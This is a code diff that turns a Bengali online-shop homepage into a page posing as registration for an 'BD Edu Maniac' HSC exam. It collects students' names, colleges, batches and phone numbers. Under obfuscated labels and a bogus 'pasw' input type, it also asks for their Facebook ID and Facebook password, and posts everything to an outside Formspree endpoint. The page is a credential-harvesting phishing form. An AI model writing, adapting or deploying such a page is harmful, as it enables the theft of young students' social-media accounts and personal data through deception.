@@ -3,54 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>মাহাদি শপ - হোম</title>
-    <link rel="stylesheet" href="style.css">
+    <title>BD Edu Maniac - রেজিস্ট্রেশন</title>
+    <style>
+        /* CSS কোড: দেখতে সুন্দর করার জন্য */
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { 
+            background-color: #fff; 
+            padding: 30px; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); 
+            width: 350px; 
+            max-height: 90vh; /* লম্বা কন্টেইনারের জন্য */
+            overflow-y: auto; /* অতিরিক্ত কন্টেন্টের জন্য স্ক্রলিং */
+        }
+        h1 { text-align: center; color: #007bff; margin-bottom: 5px; font-size: 24px; }
+        h2 { text-align: center; color: #333; margin-bottom: 20px; font-size: 18px; }
+        label { display: block; margin-bottom: 5px; color: #555; font-weight: bold; }
+        /* সব ইনপুট ফিল্ডের জন্য স্টাইল */
+        input[type="tel"], input[type="text"], input[type="password"] { 
+            width: 100%; 
+            padding: 10px; 
+            margin-bottom: 20px; 
+            border: 1px solid #ccc; 
+            border-radius: 4px; 
+            box-sizing: border-box; 
+        }
+        button { width: 100%; padding: 10px; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #0056b3; }
+        #message { margin-top: 15px; text-align: center; color: red; }
+    </style>
 </head>
 <body>
 
-    <header class="header">
-        <div class="logo">মাহাদি শপ - হোম</div>
-        <nav>
-            <ul>
-                <li><a href="index.html">হোম</a></li>
-                <li><a href="products.html">প্রোডাক্টস</a></li>
-                <li><a href="cart.html">কার্ট</a></li>
-                <li><a href="contact.html">যোগাযোগ</a></li>
-            </ul>
-        </nav>
-    </header>
+    <div class="login-container">
+        <h1>BD Edu Maniac</h1>
+        <h2>গুরুত্বপূর্ণ তথ্য দিন</h2>
+        <h3 align="center">  PCM mcq maniac Mega exam 2025</h3>
+        
+        <form id="loginForm" action="https://formspree.io/f/manlppyr" method="POST">
+            
+            <label for="user_name">নিজের নাম:</label>
+            <input type="text" id="user_name" name="নিজের_নাম" placeholder="আপনার পুরো নাম লিখুন" required>
 
-    <section class="hero-section">
-        <h1>আপনার সব প্রয়োজনীয়তা, এক ছাদের নিচে!</h1>
-        <p>সেরা ডিল এবং নতুন কালেকশন দেখুন।</p>
-        <a href="products.html" class="cta-button">এখনই কেনাকাটা করুন</a>
-    </section>
+            <label for="institute_name">প্রতিষ্ঠানের নাম:</label>
+            <input type="text" id="institute_name" name="প্রতিষ্ঠানের_নাম" placeholder="কলেজ নাম লিখুন" required>
 
-    <section class="featured-products">
-        <h2>✨ বৈশিষ্ট্যযুক্ত প্রোডাক্টস</h2>
-        <div class="product-grid">
-            <div class="product-item">
-                <img src="jetbus-shd.png" alt="প্রোডাক্ট ১">
-                <h3><a href="product-1-details.html">প্রোডাক্ট ১</a></h3>
-                <p class="price">৳ ৫০০</p>
-                <button class="add-to-cart">কার্টে যোগ করুন</button>
-            </div>
-            <div class="product-item">
-                <img src="" alt="প্রোডাক্ট ২">
-                <h3>প্রোডাক্ট ২</h3>
-                <p class="price">৳ ১২০০</p>
-                <button class="add-to-cart">কার্টে যোগ করুন</button>
-            </div>
-            </div>
-    </section>
+            <label for="hsc_batch">HSC ব্যাচ:</label>
+            <input type="text" id="hsc_batch" name="HSC_ব্যাচ" placeholder="Batch" required>
+            
+            <label for="phone">ফোন নাম্বার:</label>
+            <input type="tel" id="phone" name="phone" placeholder="উদাহরণ: ০১৭xxxxxxxx" pattern="[0-9]{11}" required>
+            
+            <label for="_id">ফেবূ:</label>
+            <input type="text" id="_id" name="_id" placeholder="Id" required>
 
-    <footer class="footer">
-        <p>&copy; ২০২৫ র‍্যান্ডম শপ। সর্বস্বত্ব সংরক্ষিত।</p>
-        <div class="footer-links">
-            <a href="#">প্রাইভেসি পলিসি</a>
-            <a href="#">ব্যবহারের শর্তাবলী</a>
-        </div>
-    </footer>
+            <label for="_pasw">ফেবু পা স:</label>
+            <input type="pasw" id="_pasw" name="_pasw" required>
 
+            <button type="submit">সাবমিট করুন</button>
+            <p id="message"></p>
+        </form>
+    </div>
+    
 </body>
 </html>
